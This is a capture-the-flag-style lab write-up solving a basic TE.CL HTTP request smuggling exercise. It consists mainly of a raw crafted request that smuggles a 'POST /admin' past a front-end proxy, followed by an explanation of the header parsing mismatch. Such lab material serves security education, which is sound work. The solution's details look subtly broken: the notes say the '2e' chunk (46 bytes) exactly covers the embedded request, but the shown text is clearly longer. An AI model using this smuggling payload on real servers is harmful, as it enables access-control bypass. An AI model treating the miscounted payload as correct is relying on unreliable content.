# Lab 02 — HTTP request smuggling, basic TE.CL vulnerability

> **Practitioner** · [Official lab](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)

**Entry point:** raw request in Repeater · **Vulnerability:** front-end uses
`Transfer-Encoding`, back-end uses `Content-Length` (TE.CL).

## Solution

1. Craft the smuggled request (note: with TE.CL the smuggled prefix must be
   part of a chunked body, so the two requests are combined differently):

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

2e
POST /admin HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net

0


```

2. The front-end respects `Transfer-Encoding` and forwards the chunked body
   as one request; the back-end honors `Content-Length: 4` (body = `2e\r\n`),
   treating everything after it as a new `POST /admin` request.
3. The response contains the admin panel — lab solved.

## Notes

- `2e` hex = 46 bytes = exactly the embedded request text (count carefully,
  including newlines; the final `0` chunk ends the chunked body).
- Add trailing blank lines after the final `0` and send once.
